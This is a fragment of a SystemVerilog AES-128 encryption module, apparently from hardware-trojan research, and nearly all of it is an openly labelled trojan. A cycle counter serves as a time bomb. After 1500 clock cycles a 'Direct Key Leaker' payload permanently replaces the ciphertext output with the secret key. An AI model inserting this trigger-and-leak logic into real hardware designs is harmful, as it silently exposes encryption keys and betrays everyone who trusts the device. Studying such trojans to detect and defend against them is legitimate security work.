module aes_128 (
    ...
    // =================================================================
    // --- TROJAN INJECTION: Sequential Time-Bomb Trigger ---
    // =================================================================
    
    // Initialize counter to 0. It will count up to 1500 clock cycles.
    logic [15:0] trojan_counter = 16'd0; 
    logic        trojan_trigger = 1'b0;

    always_ff @(posedge clk) begin
        // If we haven't reached 1500 cycles yet, keep counting
        if (trojan_counter < 16'd1500) begin
            trojan_counter <= trojan_counter + 1'b1;
            trojan_trigger <= 1'b0;
        end else begin
            // BOOM: 1500 cycles reached. Wake up the payload!
            // It will stay triggered forever after this point.
            trojan_trigger <= 1'b1;
        end
    end

    // PAYLOAD VARIANT 5: Direct Key Leaker
    // If triggered, output the secret 'key'. Otherwise, output the normal ciphertext.
    assign out = trojan_trigger ? key : real_ciphertext;
